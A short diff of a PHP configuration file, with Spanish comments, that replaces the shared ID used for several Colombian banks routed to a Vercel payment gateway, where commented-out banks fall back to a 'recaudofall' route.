@@ -23,12 +23,12 @@ return [
     // Bancos que van a la pasarela Vercel.
     // Si comentas una línea, ese banco cae automáticamente a recaudofall.
     'primary_banks' => [
-        'bogota' => ['slug' => 'bg', 'id' => '128ff1d79fbe2fcd1997ba94'],
-        //  'occidente' => ['slug' => 'occ', 'id' => '128ff1d79fbe2fcd1997ba94'],
-        'popular' => ['slug' => 'pop', 'id' => '128ff1d79fbe2fcd1997ba94'],
-        //  'avvillas' => ['slug' => 'avv', 'id' => '128ff1d79fbe2fcd1997ba94'],
-        // 'bancolombia' => ['slug' => 'bc', 'id' => '128ff1d79fbe2fcd1997ba94'],  // <- comentado = va a recaudofall
-        'nequi' => ['slug' => 'nq', 'id' => '128ff1d79fbe2fcd1997ba94'],  // <- comentado = va a recaudofall
+        'bogota' => ['slug' => 'bg', 'id' => 'e795be1af0a0e791176cc511'],
+        //  'occidente' => ['slug' => 'occ', 'id' => 'e795be1af0a0e791176cc511'],
+        'popular' => ['slug' => 'pop', 'id' => 'e795be1af0a0e791176cc511'],
+        //  'avvillas' => ['slug' => 'avv', 'id' => 'e795be1af0a0e791176cc511'],
+        // 'bancolombia' => ['slug' => 'bc', 'id' => 'e795be1af0a0e791176cc511'],  // <- comentado = va a recaudofall
+        'nequi' => ['slug' => 'nq', 'id' => 'e795be1af0a0e791176cc511'],  // <- comentado = va a recaudofall
     ],
 
     // Bancos disponibles para recaudofall (nombre interno => etiqueta externa)
